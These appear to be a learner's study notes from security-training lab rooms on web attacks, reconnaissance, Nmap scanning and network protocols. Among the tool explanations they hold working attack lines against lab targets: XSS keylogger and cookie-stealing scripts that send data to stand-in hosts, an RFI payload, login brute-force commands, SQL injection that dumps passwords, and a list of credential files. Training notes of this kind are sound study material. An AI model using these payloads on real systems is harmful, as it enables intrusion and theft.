```
## for room.
ctrl+B for subtopic.
```

## Content Discovery
- Wappalyzer (https://www.wappalyzer.com/)
- The Wayback Machine (https://archive.org/web/)
- Automated Discovery https://github.com/danielmiessler/SecLists 
- ffuf,  “Fuzz Faster you Fool” 
- ``` user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ ```
- dirb 
- ``` user@machine$ dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt ```
- gobuster
- ``` user@machine$ gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt ```

## Subdomain Enumeration
1. Certificate Transparency (CT) logs
- SSL/TLS Certificates. (https://crt.sh ; https://transparencyreport.google.com/https/certificates)
2. google search ```-site:www.tryhackme.com  site:*.tryhackme.com```
3. ``` dnsrecon -t brt -d acmeitsupport.thm ```
4. ``` ./sublist3r.py -d acmeitsupport.thm ```
5. private DNS server. "/etc/hosts" file (or c:\windows\system32\drivers\etc\hosts file for Windows users) 
6. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 ```
7. ``` ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.123.130 -fs {size} ``` -fs switch, which tells ffuf to ignore any results that are of the specified size.

## Authentication Bypass
**fuzz posibble exist usernames.**
- https://github.com/ffuf/ffuf
- ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.94.177/customers/signup -mr "username already exists" ```
-  -X argument specifies the request method.
-  -d argument specifies the data that we are going to send.
-  -H argument is used for adding additional headers to the request. setting the "Content-Type" to the webserver knows we are sending form data. 
-  -u argument specifies the URL we are making the request to.
-  -mr argument is the text on the page we are looking for to validate we've found a valid username.

**brute force**
- ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.2.151/customers/login -fc 200 ```
- -fc argument to check for an HTTP status code other than 200.

**logic flaw**
- ``` curl 'http://10.10.2.151/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm' ```
- the server send email to the address client posts

**cookie tempering**
- ``` curl -H "Cookie: logged_in=true; admin=true" http://10.10.2.151/cookie-test ```
- Hash crack website. https://crackstation.net/

## IDOR
-  Insecure Direct Object Reference

**find IDOR in Encode IDs**
- https://www.base64decode.org/; https://www.base64encode.org/ 

**find IDOR in Hashed IDs**
- https://crackstation.net/

## File Inclusion

**common OS files:**
- /etc/issue, /etc/profile, /proc/version, /etc/passwd,
- /etc/shadow, /root/.bash_history, /var/log/dmessage,
- /var/mail/root, /root/.ssh/id_rsa, /var/log/apache2/access.log
- C:\boot.ini


**Php include function:**
- https://www.php.net/manual/en/function.include.php


**file-get-contents.php:** 
- https://www.php.net/manual/en/function.file-get-contents.php
- user's input is passed to a function such as file_get_contents in PHP.
-  It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. 
```php
file_get_contents(
    string $filename,
    bool $use_include_path = false,
    resource $context = ?,
    int $offset = 0,
    int $length = ?
): string|false
```

**Local File Inclusion (LFI)**
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12. Auto add ".php".
- Conquer: ``` include("languages/../../../../../etc/passwd%00").".php"); ``` %00 or 0x00
- NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.

**Remote File Inclusion - RFI**
- One requirement for RFI is that the ``` allow_url_fopen ``` option needs to be on.
- ``` allow_url_include ```
- https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen
- lead server to execute code from attacker`s server.
- start attack server: ``` sudo python3 -m http.server ```
- prepare payload: cmd.txt: ``` <?php print exec('hostname');?> ```
- lead victim server to execute it: http://webapp.htm/get.php?file=http://attacker.thm/cmd.txt

## SSRF
- server side request forgery
- 2 types: regular, blind.
- ![image](https://user-images.githubusercontent.com/91292763/147397891-1b4af01a-9f39-4b36-bd33-05bc21b2313e.png)
- requestbin.com

## XSS
- cross-site scripting
- Key Logger js: ``` document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );} ```
- Session Stealing js: ``` fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie)); ```

**DOM Based XSS**
- DOM: https://www.w3.org/TR/REC-DOM-Level-1/introduction.html
- ``` window.location.hash ``` parameter.
- js: eval() function is very vulnerable.

**Blind Xss**
- https://xsshunter.com/
- ``` /images/cat.jpg" onload="alert('HTM'); ``` When upload an image, but server filter '<' and '>', we can use onload function.
 
**Polyglots**:
- Can help you bypass all filters.
- ``` jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e ```
- https://blog.ostorlab.co/polyglot-xss.html

Get cookie from xss:
- net cat: ``` nc -nlvp 9001 ``` start server.
- ``` fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) ); ```
- wait for the victim.

## Command Injection
- also often known as “Remote Code Execution” (RCE) 
- https://owasp.org/www-project-top-ten/
- https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report
- php vulnerable functions: ``` Exec ```, ``` Passthru ```, ``` System ```
- php: ``` filter_input ``` https://www.php.net/manual/en/function.filter-input.php
- use hexadecimal value to bypass the filter.
- cheat sheet for more payloads: https://github.com/payloadbox/command-injection-payload-list

## SQL Injection
- Structured Query Language
- ``` select * from users where username like 'a%'; ``` returns any rows with username beginning with the letter a.
- ``` select * from users where username like '%n'; ```  ending with the letter n.
- ``` select * from users where username like '%mi%'; ``` characters mi within them.

Union
- ``` SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers; ```

Insert
- ``` insert into users (username,password) values ('bob','password123'); ```

Update
- ``` update users SET username='root',password='pass123' where username='admin'; ```

Delete
- ``` delete from users where username='martin'; ```

In-Band SQL Injection
- select * from article where id = ``` 0 UNION SELECT 1,2,database() ```
- get database name
- select * from article where id = ``` 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' ```
- get table names in the database "sqli_one"
- select * from article where id = ``` 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' ```
- get column names in the table "staff_users"
- select * from article where id = ``` 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users ```

Blind SQLi (Boolean Based)
- select * from users where username = '```A' UNION SELECT 1,2,3 WHERE database() like 's%';--```' LIMIT 1 
- we can try every possible combination to find the database`s name.

Blind SQLi (Time base)
The table has 2 columns.
- ``` admin123' UNION SELECT SLEEP(5);-- ``` No sleep, just return.
- ``` admin123' UNION SELECT SLEEP(5),2;-- ``` Sleep for 5 sconds.

Out-of-Band SQLi:
- attack channel could be a web request
- data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

Remediation：
- Prepared Statements (With Parameterized Queries)
- Input Validation
- Escaping User Input

## Burp Suite Basic
**Extensions**
- java, jython, jRuby
- https://www.jython.org/
- https://www.jruby.org/
- Burp Suite Extender module: load extension, providing a marketplace.

**Proxy**
- https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-basic/
- Intercept server response. ```Or``` ```Request``` ```Was Intercepted```

**embeded browser**
- ```Project options -> Misc -> Embedded Browser``` and check the ```Allow the embedded browser to run without a sandbox```
- create a new user and run Burp Suite under a low privilege account.(security, recomanded)

**scope**
- after set scope, we need: Proxy Options sub-tab and select ```And``` ```URL``` ```Is in target scope```

**Post modified request**
- URL encode: ctrl+U
```
POST /ticket/ HTTP/1.1
Host: 10.10.117.83
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.10.117.83
Connection: close
Referer: http://10.10.117.83/ticket/
Upgrade-Insecure-Requests: 1

email=<scripttt>alert("Succ3ssful%2bXSS")</scripttt>&content=hack+test
```
- "%2b" -> "+"

## Brup Suite: Repeater
- Another way: by hand, curl, https://curl.se/
- 0x0d -－"/r"
- 0x0a -－"/n"
- each line of response ends with "/r/n", same as "0d0a".

**SQLi with repeater**
- query ```http://10.10.39.188/about/2'``` with a ```'``` behind.
- 
``` 
<code>Invalid statement: 
    <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>
</code>
```
- The INFORMATION_SCHEMA Database: “This is the database about databases. It’s used to store details of other databases on the server”.

- ``` /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" ```
- this requey can only retrieve one column_nmae of the people table.
- MySQL GROUP_CONCAT() function returns a string with concatenated non-NULL value from a group.
- Notice that we also changed the ID that we are selecting from 2 to 0. By setting the ID to an invalid number, we  ensure that we don't retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query.
- ``` /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" ```
- retrieve all columns name of people table.

## burpsuite intruder
- Intruder is Burp Suite's in-built fuzzing tool.
- similar to Wfuzz or Ffuf.

**4 attacks:**
- sniper attack: pos1, pos2, 3 word a b c. Try: pos1,a; pos1,b; pos1,c;   a,pos2; b,pos2; c,pos2. One wordlist set.
- Battering ram attack: puts the same payload in every position rather than in each position in turn. One wordlist set.
- Pitchfork attack: uses one payload set per position. iterates through them all at once. Word lists should be identical length.
- Cluster bomb attack: iterates through each payload set individually, making sure that every possible combination is tested.

**CSRF Token bypass:**
-  a session cookie set in the response, as well as a CSRF (Cross-Site Request Forgery) token included in the form as a hidden field. If we refresh the page, we should see that both of these change with each request: this means that we will need to extract valid values for both every time we make a request.
-  Run macro to "Get" the session every time before intruder.
-  update current request with parameters matched from final macro response. (this case, the "session" parameter.)
-  Update current request with cookies from session handling cookie jar.
- ref: https://portswigger.net/burp/documentation/desktop/options/sessions
- csrf token: https://portswigger.net/web-security/csrf/tokens

## Burp Suite: Other Modules
**Decoder**
- https://gchq.github.io/CyberChef/

**Sequencer**
- the effective entropy.

## Burp Suite: Extender
- Burp Suite "BApp" store.
- all traffic passing through Burp Suite will be passed through each extension in order, starting at the top of the list and working down. 
- https://github.com/portswigger/request-timer
- <img width="474" alt="image" src="https://user-images.githubusercontent.com/91292763/147384694-64caa155-123c-495b-a734-917290d13658.png">
- Jython. https://www.jython.org/download. significantly increases the number of extensions available to us.
- Jruby. https://www.jruby.org/download.

**Write extender:**
- https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension

## Passive Reconnaissance
**The Unified Kill Chain**
- https://www.unifiedkillchain.com/

**whois**
- https://www.ietf.org/rfc/rfc3912.txt

## Nmap Live Host Discovery

**nslookup and dig**
- ``` nslookup tryhackme.com ```
- ``` nslookup -type=A tryhackme.com 1.1.1.1 ``` find ipv4 in 1.1.1.1
- ``` dig tryhackme.com MX ```
- ``` dig @1.1.1.1 tryhackme.com MX ```
- ``` dig thmlabs.com txt ```

DNS records can find more information, like subdomain, especially which not updated regularly.
**dnsdumpster**
- https://dnsdumpster.com/

**Shodan.io**
- https://help.shodan.io/the-basics/search-query-fundamentals
- https://tryhackme.com/room/shodan

## Active Reconnaissance
**web browser**
- FoxyProxy(add-one):https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
- User-Agent Switcher and Manager: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
- Wappalyzer https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
- ctrl+shift+I: sources -> script.js

**ping**
count (2 are same)
- ``` ping -n 10 10.10.117.50 ``` on MS Windows system.
- ``` ping -c 10 10.10.117.50 ``` on Linux or Mac OS.

**Traceroute**
-  when TTL reaches 0, an ICMP Time-to-Live exceeded would be sent to the original sender.
-  On linux, traceroute is send in UDP datagrams.

**Telnet**
- use Telnet to connect to any service and grab its banner.(not it designed for.)
- ``` telnet 10.10.117.50 80 ``` then ``` GET / HTTP/1.1 ```
- get the service information.

**Netcat**
GET
- Netcat supports both TCP and UDP protocols.
- ``` nc 10.10.108.61 PORT ``` ``` hostname:abc ``` then, SHIFT+ENTER 

Open port and listen
- ``` nc -vnlp 1234 ```
- -l	Listen mode
- -p	Specify the Port number
- -n	Numeric only; no resolution of hostnames via DNS
- -v	Verbose output (optional, yet useful to discover any bugs)
- -vv	Very Verbose (optional)
- -k	Keep listening after client disconnects

**Nmap**
![image](https://user-images.githubusercontent.com/91292763/147562879-93e285b4-8fea-4f67-b273-d2e39eb7ffd1.png)

use list
- ``` nmap -iL list_of_hosts.txt ``` -iL: input filename.

ARP
- ``` nmap -PR -sn 192.168.0.1/24 ``` -PR: indicates that you only want an ARP scan. -sn: No port scan.

ICMP
- ``` nmap -PE -sn 192.168.0.1/24 ``` -PE: ICMP.
- Nmap didn’t need to send ICMP packets as it confirmed that these hosts are up based on the ARP responses it received.
- if in same subnet, we can see the MAC address.

TCP SYN
- ``` sudo nmap -PS -sn 192.168.1.1/24 ``` -PS:  TCP SYN ping.
- Normal syn ping do not need root user.
- Privileged users (root and sudoers) can send TCP SYN packets and don’t need to complete the TCP 3-way handshake even if the port is open. Will send RST instead. Can **avoid some firewall rules**.
- ``` -PS21 ``` target on port 21.
- ``` -PS21-25 ``` 21 to 25.

TCP ACK
- ``` sudo nmap -PA -sn MACHINE_IP/24 ```
- need root.

UDP 
- ``` sudo nmap -PU -sn 10.10.68.220/24 ```

**Reverse-DNS Lookup**
- Nmap’s default behaviour is to use reverse-DNS online hosts.
- -n to skip this step.
- -R to query the DNS server even for offline hosts

## Nmap Basic Port Scans
Port States:
1. Open
2. Closed
3. Filtered
4. Unfiltered
5. Open|Filtered
6. Closed|Filtered

**TCP header**
- https://datatracker.ietf.org/doc/html/rfc793.html
- ![image](https://user-images.githubusercontent.com/91292763/147625615-9c0835f0-f8cb-4b0b-8db1-110eb867ebb1.png)
- URG flag: set is processed immediately without consideration of having to wait on previously sent TCP segments.
- Push flag： asking TCP to pass the data to the application promptly.

**TCP Scan**
- TCP connect scan. ``` nmap -sT {target} ```  full 3-way handshake, then RST. Only possible TCP port scan if not root.
- TCP SYN scan. ``` nmap -sS {target} ``` need root. 

**UDP Scan**
- ``` nmap -sU {target} ``` Open: no response. Closed: ICMP destination unreachable. 

**Scope and performance**
- ``` -F ``` most common 100 ports
- ``` -T0 ``` scans one port at a time and waits 5 minutes
- ``` -T5 ``` is the most aggressive in terms of speed
- ``` -T4 ``` is often used during CTFs
- ``` --max-rate 10 ``` or ``` --max-rate=10 ``` ensures that your scanner is not sending more than ten packets per second.
- ``` --min-parallelism=512 ``` pushes Nmap to maintain at least 512 probes in parallel
- ``` -p- ``` all ports.

## Nmap Advanced Port Scans

Null Scan
- ``` sudo nmap -sN 10.10.22.67 ```, all six flag bits are set to zero.
- closed: RST,ACK. open|filtered: no reply.
- need root.

FIN Scan
- ``` sudo nmap -sF 10.10.22.67 ```, FIN flag set.
- closed: RST,ACK. open|filtered: no reply.

Xmas Scan
- ``` sudo nmap -sX 10.10.22.67 ```, FIN, PSH, and URG flags set.
- closed: RST,ACK. open|filtered: no reply.

Why:
- A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. 
- Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. 
- However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.

TCP Maimon Scan:
-  ``` sudo nmap -sM 10.10.22.67 ```, FIN and ACK bits are set.
- no much use, open and close reply almost same.

TCP ACK Scan:
-  ``` sudo nmap -sA 10.10.22.67 ```, ACK flag set.
-  can not find if port is open.
-  this type of scan is more suitable to discover firewall rule sets and configuration.
-  Result indicates that the firewall is blocking all other ports except for these three ports.

Window Scan:
- ``` sudo nmap -sW 10.10.22.67 ```, like ACK scan, with more examines the TCP Window field of the RST packets returned.
- TCP window scan pointed that three ports are detected as closed.
- Although we know that these three ports are closed, we realize they responded differently, indicating that the firewall does not block them.
- ACK and window scans are exposing the firewall rules, not the services.

Custom Scan:
- ``` sudo nmap --scanflags RSTSYNFIN {target} ``` 

**Spoofing and Decoys**

- ``` nmap -S {SPOOFED_IP} 10.10.121.57 ``` 
- ``` --spoof-mac SPOOFED_MAC ``` This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).
- ``` nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.121.57 ``` decoy, hide among other IPs. RND, random IP.

**Fragmented Packets**
- A traditional firewall inspects, at least, the IP header and the transport layer header. 
- A more sophisticated firewall would also try to examine the data carried by the transport layer.
- ``` sudo nmap -sS -p80 -f 10.20.30.144 ``` 8 bytes after IP header, in each packet.
- ``` sudo nmap -sS -p80 -ff 10.20.30.144 ``` 16 bytes after IP header, in each packet.
- Nmap splits the packets into eight bytes or less after the IP header. So a 20-byte TCP header would be split into three packets.
- The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect.

**Idle/Zombie Scan**
- ``` nmap -sI ZOMBIE_IP 10.10.121.57 ```
- This is accomplished by checking the IP identification (IP ID) value in the IP header.

**More Details**
- ``` sudo nmap -sS --reason 10.10.252.27 ``` get .
- ``` -v ``` for verbose output or ``` -vv ``` for even more verbosity.
- ``` -d ``` for debugging details or ``` -dd ``` for even more details.

## Nmap Post Port Scans
**OS Detection and Traceroute**
- ``` sudo nmap -sV 10.10.129.53 ``` Version detection.
- ``` sudo nmap -sS -O 10.10.129.53 ``` OS detection.
- ``` nmap -sS --traceroute 10.10.129.53 ``` traceroute, Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.

 **Nmap Scripting Engine (NSE)**
 - Lua language.
 - path: /usr/share/nmap/scripts
 - ``` -sC ``` Default scripts
 
Script Category	Description
- auth	Authentication related scripts
- broadcast	Discover hosts by sending broadcast messages
- brute	Performs brute-force password auditing against logins
- default	Default scripts, same as -sC
- discovery	Retrieve accessible information, such as database tables and DNS names
- dos	Detects servers vulnerable to Denial of Service (DoS)
- exploit	Attempts to exploit various vulnerable services
- external	Checks using a third-party service, such as Geoplugin and Virustotal
- fuzzer	Launch fuzzing attacks
- intrusive	Intrusive scripts such as brute-force attacks and exploitation
- malware	Scans for backdoors
- safe	Safe scripts that won’t crash the target
- version	Retrieve service versions
- vuln	Checks for vulnerabilities or exploit vulnerable services

http-date
- ``` sudo nmap -sS -n --script "http-date" 10.10.16.134 ```

find a certain script
- ``` /usr/share/nmap/scripts# find -name '*cve2015-1635*' ```
- with 'cve2015-1635' in the middle of the file name.

**Saving the Output**
Normal
- ``` -oN FILENAME ```, N stands for normal
Grepable
- ``` -oG FILENAME ```
XML
- ``` -oX FILENAME ```

## Protocols and Servers
**http**
- ``` telnet 10.10.115.51 80 ```
- ``` GET /index.html HTTP/1.1 ```
- ``` host: telnet ```
- double 'Enter'

**ftp**
Use telnet
- File Transfer Protocol, cleartext
- ``` telnet 10.10.115.51 21 ```
- ``` USER frank ```
- ``` PASS D2xc9CgD ```
- ``` STAT ``` can provide some added information
- ``` SYST ``` command shows the System Type of the target (UNIX in this case)
- ``` PASV ``` switches the mode to passive. Active: port 20. Passive: ports above 1023.
- ``` TYPE A ``` switches the file transfer mode to ASCII.
- ``` TYPE I ``` switches the file transfer mode to binary.
- we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.

use ftp
- ``` ftp 10.10.115.51 ```
- ``` ftp> ls ```
- ``` ftp> ascii ```
- ``` ftp> get README.txt ```
- ``` ftp> exit ```
- ftp software: vsftpd, ProFTPD, uFTP. Some web browsers also support FTP protocol.

**SMTP**
4 components:
- Mail Submission Agent (MSA)
- Mail Transfer Agent (MTA):  (SMTP)
- Mail Delivery Agent (MDA):  (POP3) or (IMAP)
- Mail User Agent (MUA)

SMTP
- is used to communicate with an MTA server.
- default port 25.
- ``` telnet MACHINE_IP 25 ```

POP3
- your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages.
- download the email messages from a Mail Delivery Agent (MDA) server
- default port 110
- ``` telnet 10.10.124.6 110 ```
- ``` USER frank ```
- ``` PASS D2xc9CgD ```
- ``` STAT ```

IMAP
- Internet Message Access Protocol (IMAP)
- default port 143
- possible to keep your email synchronized across multiple devices (and mail clients), POP3 can not.
- changes will be saved on the IMAP server (MDA)
- ``` telnet 10.10.124.6 143 ```
- ``` LOGIN frank D2xc9CgD ```

## Protocols and Servers 2

**VS:**
- Confidentiality, Integrity,   Availability (CIA)
- Disclosure,      Alternation, Destruction (DAD)

**Sniffing Attack**
- Tcpdump, Wireshark, Tshark
- ``` sudo tcpdump port 110 -A ``` checking email messages using POP3, in ASCII format.
- mitigation： Transport Layer Security (TLS) has been added to HTTP, FTP, SMTP, POP3, IMAP and many others.

**Man-in-the-Middle (MITM) Attack**
- Ettercap. https://www.ettercap-project.org/
- Bettercap. https://www.bettercap.org/
-  With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.

SSL, TSL are on presentation layer.
- https://datatracker.ietf.org/doc/html/rfc6101

ports:
- HTTP	80	HTTPS	443
- FTP	21	FTPS	990. secured using SSL/TLS
- FTP   21	SFTP	22. secured using the SSH protocol, same port.
- SMTP	25	SMTPS	465
- POP3	110	POP3S	995
- IMAP	143	IMAPS	993
- DNS   DoT(DNS over TLS )
- TELNET 23
- SSH 22

process:
- Establish a TCP connection
- Establish SSL/TLS connection
- Send HTTP requests to the webserver

SSH:
- port 22.
- ``` ssh username@10.10.202.115 ```

SCP:
- can use SSH to transfer files using SCP (Secure Copy Protocol) based on the SSH protocol
- ``` scp mark@10.10.202.115:/home/mark/archive.tar.gz ~ ``` remote to local
- ``` scp backup.tar.bz2 mark@10.10.202.115:/home/mark/ ``` local to remote

**Password Attack**
- Hydra. https://github.com/vanhauser-thc/thc-hydra
- ``` hydra -l username -P wordlist.txt server service ```
- server: the hostname or IP address of the target server.
- service: the service which you are trying to launch the dictionary attack.
- ``` -s PORT ``` Use in case of non-default service port number
- ``` -d ``` Display debugging output if the verbose output is not helping
- ``` -V ``` or ``` -vV ``` Show the username and password combinations being tried

## Vulnerabilities 101
**types**
- Operating System
- (Mis)Configuration-based
- Weak or Default Credentials
- Application Logic
- Human-Factor

**Scoring Vulnerabilities**
CVSS
- https://www.kennasecurity.com/resources/prioritization-to-prediction-report/
- CVSS, https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
- open source, VPR not.
- start in 2005.

VPR 
- Vulnerability Priority Rating.
- takes into account the relevancy of a vulnerability, while CVSS does not.

**Vulnerability Databases**
NVD
- NVD (National Vulnerability Database) https://nvd.nist.gov/vuln/full-listing
- "Common Vulnerabilities and Exposures" (Or CVE for short)
- wanna cry: CVE-2017-0144


Exploit-DB 
- https://www.exploit-db.com/

## Exploit Vulnerabilities

**Automated Vs. Manual Vulnerability Research**
- nessus. https://www.tenable.com/products/nessus

Vulnerability types:
- Security Misconfigurations
- Broken Access Control
- Insecure Deserialization
- Injection

**Finding Manual Exploits**
- Rapid7, https://www.rapid7.com/db/
- GitHub, search GitHub by keywords such as "PoC", "vulnerability"
- Searchsploit, offline copy of Exploit-DB

